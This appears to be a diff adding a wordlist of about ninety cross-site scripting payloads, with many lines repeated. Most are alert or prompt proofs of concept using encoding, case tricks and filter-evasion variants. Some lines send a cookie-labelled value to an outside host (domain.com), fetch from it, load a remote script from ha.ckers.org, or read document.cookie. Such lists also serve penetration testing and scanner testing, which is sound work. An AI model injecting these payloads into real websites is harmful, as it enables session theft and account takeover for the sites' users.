@@ -1,0 +1,94 @@
+<s>test</s>
+<b>test</b>
+<script>alert(1)</script>
+"/>
+" onmouseover="alert(document.domain)
+" autofocus="1" onfocus="alert(document.domain)
+<html><svg> onload="const cred=document.domain; new Image().src='http://domain.com?cookie=' + encodeURIComponent(cred);"></svg></html>
+<img src=x onerror=\"fetch('http://domain.com/fetch')\"></img>
+<img src=x onload=\"fetch('http://domain.com/fetch')\"></img>
+%20%20%20%26lt%3bscript%26gt%3balert(%22XSS%22)%26lt%3b%2fscript%26gt%3b
+<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
+<svg onload=prompt%26%230000000040document.domain)>
+<Img Src=On OnError=alert(1)>
+<script>alert(document.domain)</script>
+;alert(document.domain)
+';alert(document.domain)
+;alert(document.domain);//
+';alert(document.domain);//
+"><script>alert(document.domain)</script>
+%27%3balert(1)%2f%2f
+</script><h1>OS</h1>
+'%3balert(1)%2f%2f
+')};alert(/XSS/);</script>
+><script>alert("XSS")</script>
+"><svg%20onload=alert(/XSS/)>
+"><svg/onload=alert(123)>
+<img src onerror=alert(1)>
+javascript:alert(document.cookie)
+<img-onload-alert(1)>
+"><img-onload-alert(1)>
+">javascript:alert(document.cookie)
+<>javascript:alert(document.cookie)
+%22</noscript></script><svg/onload=alert(1)></svg>
+%3c%2fspan%3e%3csvg%2fonload=alert(%22XSS%22)%3e
+%3c%2ftitle%3e%3csvg%20onload=alert%28123%29%3e
+%22%3E%3Cimg%20src=1%20onerror=alert(/XSS/)%3E
+',)%3b%7d)%3balert('XSS')%3b(function()%7bB().A('roofndboof
+%22"</noscript>aaaaaaaa</aa><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt']('XSS')></a>
+roofndboof"'</script><div frame="><script>alert(/AribaCWlink/)</script><div+frame="><script>
+;alert(document.domain)
+';alert(document.domain)
+;alert(document.domain);//
+';alert(document.domain);//
+%27%3balert(1)%2f%2f
+</script><h1>OS</h1>
+'%3balert(1)%2f%2f
+')};alert(/XSS/);</script>
+><script>alert("XSS")</script>
+"><svg%20onload=alert(/XSS/)>
+"><svg/onload=alert(123)>
+"><svg onload=alert(1)>
+"><img src onerror=alert(1)>
+<img src onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+"<img src=1 onerror=alert(1)>
+"><img src=1 onerror=alert(1)>
+"><img src=1 onload=alert(1)>
+<img src=1 onload=alert(1)>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<><img src=1 onerror=alert(1)>
+%22</noscript></script><svg/onload=alert(1)></svg>
+%3c%2fspan%3e%3csvg%2fonload=alert(%22XSS%22)%3e
+%3c%2ftitle%3e%3csvg%20onload=alert%28123%29%3e
+%22%3E%3Cimg%20src=1%20onerror=alert(/XSS/)%3E
+',)%3b%7d)%3balert('XSS')%3b(function()%7bB().A('roofndboof
+%22"</noscript>aaaaaaaa</aa><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt']('XSS')></a>
+roofndboof"'</script><div frame="><script>alert(/AribaCWlink/)</script><div+frame="><script>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
